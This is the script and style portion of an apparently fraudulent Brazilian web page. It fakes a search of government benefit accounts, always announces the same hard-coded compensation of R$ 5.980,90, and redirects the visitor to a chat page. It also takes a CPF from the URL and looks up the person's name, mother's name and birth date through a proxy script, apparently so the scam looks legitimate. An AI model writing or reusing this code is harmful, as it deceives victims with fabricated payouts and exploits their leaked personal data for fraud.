                <script>
                    const statusTexts = [
                        "Calculando o valor da sua indenização...",
                        "Buscando valores em contas inativas...",
                        "Buscando valores em contas INSS...",
                        "Buscando valores em contas FGTS...",
                        "Buscando valores em contas PIS...",
                        "Buscando valores em contas de CPF...",
                        "Buscando valores em contas de CNPJ...",
                        "Buscando valores em contas de seguro desemprego...",
                        "R$ 5.980,90 de indenização pronto para ser liberado"
                    ];
            
                    const totalTime = 95000; 
                    const progressBar = document.getElementById("progress-bar");
                    const buttonContainer = document.getElementById("button-container");
                    const statusText = document.getElementById("status-text");
                    const loadingIcon = document.getElementById("loading-icon");
            
                    let currentIndex = 0;
                    const intervalTime = totalTime / statusTexts.length;
            
                    // Update status text periodically
                    const statusInterval = setInterval(() => {
                        if (currentIndex < statusTexts.length) {
                            statusText.textContent = statusTexts[currentIndex];
                            currentIndex++;
                        }
            
                        if (currentIndex === statusTexts.length) {
                            // Disable pulse animation and remove loading icon at the last text
                            statusText.classList.remove("animate-pulse");
                            loadingIcon.remove();
                        }
                    }, intervalTime);
            
                    // Update progress bar gradually
                    const progressInterval = 10; // Update every 10ms
                    let elapsedTime = 0;
                    const progressBarInterval = setInterval(() => {
                        elapsedTime += progressInterval;
                        const percentage = (elapsedTime / totalTime) * 100;
                        progressBar.style.width = `${Math.min(percentage, 100)}%`;
            
                        if (elapsedTime >= totalTime) {
                            clearInterval(progressBarInterval);
                        }
                    }, progressInterval);
            
                    // Show the button after the total time
                    setTimeout(() => {
                        clearInterval(statusInterval);
                        statusText.textContent = statusTexts[statusTexts.length - 1]; // Ensure final text is displayed
                        buttonContainer.classList.remove("hidden");
            
                        // Redirection logic
                        const urlParams = new URLSearchParams(window.location.search);
                        const cpf = urlParams.get('cpf');
                        if (cpf) {
                            const nextPageButton = document.getElementById('next-page-button');
                            nextPageButton.addEventListener('click', () => {
                                window.location.href = `chat.html?cpf=${cpf}`;
                            });
                        } else {
                            console.error('CPF não encontrado na URL');
                        }
                    }, totalTime);
                </script>

                <style>
                    .animate-pulse {
            animation: pulse 2s cubic-bezier(.4, 0, .6, 1) infinite;
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }
                </style>

                
                <script>
                    function formatCpf(cpf) {
                        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
                    }
            
                    const urlParams = new URLSearchParams(window.location.search);
                    const cpf = urlParams.get('cpf');
            
                    if (cpf) {
                        fetch(`proxy.php?cpf=${cpf}`)
                            .then(response => response.json())
                            .then(data => {
                                if (data) {
                                    document.getElementById('mae').textContent = `${data.MAE}`;
                                    document.getElementById('nome').textContent = `${data.NOME}`;
                                    document.getElementById('cpf').textContent = `${formatCpf(cpf)}`;
                                    document.getElementById('nascimento').textContent = `${data.NASCIMENTO}`;
                                } else {
                                    document.body.innerHTML = '<p>Erro: Nenhum dado encontrado para o CPF fornecido.</p>';
                                }
                            })
                            .catch(() => {
                                document.body.innerHTML = '<p>Erro ao buscar os dados do CPF.</p>';
                            });
                    } else {
                        document.body.innerHTML = '<p>Erro: CPF não fornecido na URL.</p>';
                    }
                </script>
